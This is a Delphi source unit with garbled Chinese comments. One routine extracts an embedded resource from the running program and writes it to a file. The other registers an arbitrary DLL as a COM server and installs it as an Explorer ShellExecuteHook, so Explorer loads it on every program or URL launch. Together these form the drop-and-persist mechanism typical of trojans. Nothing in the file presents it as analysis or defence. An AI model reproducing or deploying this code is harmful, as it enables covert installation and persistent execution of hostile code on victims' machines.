unit FunUnit;

interface

function ResourceToFile(const ResType, ResName, FileName: PChar): Boolean; // �ͷ���Դ���ļ�
procedure SetupShellHook(const ComDLL_FileName: PChar); // ���Urlִ�йҹ�

implementation

uses Windows;
  
  // �ͷ���Դ���ļ�       
function ResourceToFile(const ResType, ResName, FileName: PChar): Boolean;
var
  HResource, HGlobal, HFile: THandle;
  FSize, WSize: DWORD;
  FMemory: Pointer;
begin
  Result := FALSE;
  
 // ��λ��Դ
  HResource := FindResource(HInstance, ResName, ResType);
  if (HResource = 0) then Exit;

 // װ����Դ
  HGlobal := LoadResource(HInstance, HResource);
  if (HGlobal = 0) then Exit;

 // �����ڴ�
  FMemory := LockResource(HGlobal);
  if (FMemory = nil) then
  begin
    FreeResource(HGlobal);
    Exit;
  end;

 // �����ļ�
  HFile := CreateFile(FileName, GENERIC_WRITE, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  if (HFile = INVALID_HANDLE_VALUE) then
  begin
    UnlockResource(HGlobal);
    FreeResource(HGlobal);
    Exit;
  end;

 // д���ļ�
  FSize := SizeOfResource(HInstance, HResource);
  WriteFile(HFile, FMemory^, FSize, Wsize, nil);
  if (FSize <> Wsize) then
  begin
    UnlockResource(HGlobal);  
    FreeResource(HGlobal);
    Exit;
  end;

 // �رձ���
  SetEndofFile(HFile);
  CloseHandle(HFile);
  
 // �����ͷ�
  UnlockResource(HGlobal);
  FreeResource(HGlobal);

  Result := TRUE;  
end;  

  // ���Urlִ�йҹ�    
procedure SetupShellHook(const ComDLL_FileName: PChar);
    // �����ַ�������
  function StrLen(const Str: PChar): Cardinal; assembler;
  asm
        MOV     EDX,EDI
        MOV     EDI,EAX
        MOV     ECX,0FFFFFFFFH
        XOR     AL,AL
        REPNE   SCASB
        MOV     EAX,0FFFFFFFEH
        SUB     EAX,ECX
        MOV     EDI,EDX
  end;
    // ���ע�����Ŀ
  procedure AddStrToReg(RootKey: HKEY; const StrPath, StrName, StrData: PChar);
  var
    TempKey: HKEY;
    Disposition, DataSize: LongWord;
  begin
   // ��
    TempKey := 0;
    Disposition := REG_CREATED_NEW_KEY;
    RegCreateKeyEx(RootKey, StrPath, 0, nil, 0, KEY_ALL_ACCESS, nil, TempKey, @Disposition);

   // ���
    DataSize := StrLen(StrData) + 1;
    RegSetValueEx(TempKey, StrName, 0, REG_SZ, StrData, DataSize);
    
   // �ر�
    RegCloseKey(TempKey);
  end;
const
  HookName = '{5EED7056-B89D-4DE8-A060-D285EA746799}';
  HookPath = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellExecuteHooks';
var
  TempStr: string;
begin
 // ��Ӷ���
  TempStr := 'CLSID\' + HookName;
  AddStrToReg(HKEY_CLASSES_ROOT, @TempStr[1], '', 'URL ִ�йҹ�    By ����');

 // �������� 
  TempStr := TempStr + '\InProcServer32';
  AddStrToReg(HKEY_CLASSES_ROOT, @TempStr[1], '', ComDLL_FileName);
  AddStrToReg(HKEY_CLASSES_ROOT, @TempStr[1], 'ThreadingModel', 'Apartment');

 // ���Hook
  AddStrToReg(HKEY_LOCAL_MACHINE, HookPath, HookName, '');
end;

end.
